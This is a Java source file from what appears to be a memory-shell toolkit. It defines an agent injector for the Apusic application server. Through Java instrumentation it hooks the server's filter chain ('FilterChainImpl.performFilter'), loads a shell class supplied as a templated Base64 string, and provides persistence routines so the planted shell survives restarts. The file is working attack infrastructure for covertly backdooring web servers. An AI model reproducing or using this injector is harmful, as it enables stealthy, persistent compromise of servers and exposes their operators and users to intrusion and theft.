package com.reajason.javaweb.memshell.injector.apusic;

import com.reajason.javaweb.agent.AgentInjectorSupport;
import com.reajason.javaweb.agent.AgentPersistence;

import java.io.File;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;

/**
 * @author ReaJason
 * @since 2025/3/26
 */
public class ApusicFilterChainAgentInjector {
    private static final AgentInjectorSupport.Config CONFIG = AgentInjectorSupport.Config
            .of("com/apusic/web/container/FilterChainImpl", "performFilter")
            .description("the Apusic filter chain class");
    private static volatile ClassFileTransformer transformer;

    public static String getClassName() {
        return "{{advisorName}}";
    }

    public static String getBase64String() {
        return "{{base64String}}";
    }

    public static void premain(String args, Instrumentation inst) throws Exception {
        transformer = AgentPersistence.launch(args, inst, transformer, CONFIG, getClassName(), getBase64String());
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        premain(args, inst);
    }

    static boolean isPersistent(String args) {
        return AgentPersistence.isPersistent(args);
    }

    static File persist(Class<?> targetClass) throws Exception {
        return AgentPersistence.persist(targetClass, CONFIG, getClassName(), getBase64String());
    }

    static File persist(Class<?> targetClass, String shellClassName, byte[] shellClassBytes) throws Exception {
        return AgentPersistence.persist(targetClass, CONFIG, shellClassName, shellClassBytes);
    }
}
